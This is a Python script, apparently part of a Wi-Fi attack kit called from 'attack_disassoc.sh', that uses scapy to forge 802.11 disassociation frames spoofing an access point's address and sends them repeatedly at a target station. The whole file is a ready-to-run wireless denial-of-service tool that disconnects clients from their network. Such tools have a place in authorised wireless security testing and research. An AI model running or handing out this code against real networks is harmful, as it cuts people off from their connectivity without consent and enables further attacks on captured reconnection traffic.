#!/usr/bin/env python3
"""Inject 802.11 disassoc (mgmt subtype 10) only. Not aireplay -0 (deauth).

Usage (from attack_disassoc.sh):
  python3 inject_disassoc.py <iface> <ap_bssid> <sta_mac> <seconds> <pps>
"""
from __future__ import annotations

import sys
import time

try:
    from scapy.all import Dot11, Dot11Disas, RadioTap, sendp  # type: ignore
except ImportError:
    sys.stderr.write(">>> ERROR: need scapy (Kali: apt install python3-scapy)\n")
    sys.exit(2)


def main() -> int:
    if len(sys.argv) != 6:
        sys.stderr.write("usage: inject_disassoc.py iface ap_bssid sta_mac seconds pps\n")
        return 2
    iface, ap, sta, dur_s, pps_s = sys.argv[1:]
    duration = float(dur_s)
    pps = max(1.0, float(pps_s))
    interval = 1.0 / pps
    # addr1=STA, addr2=AP spoof, addr3=BSSID. Reason 7 = class 3 from nonassociated STA.
    pkt = (
        RadioTap()
        / Dot11(type=0, subtype=10, addr1=sta, addr2=ap, addr3=ap)
        / Dot11Disas(reason=7)
    )
    deadline = time.time() + duration
    sent = 0
    while time.time() < deadline:
        sendp(pkt, iface=iface, verbose=False, count=1)
        sent += 1
        time.sleep(interval)
    print(f">>> inject_disassoc: sent {sent} frames in {duration:.0f}s @ {pps:.0f} pps")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
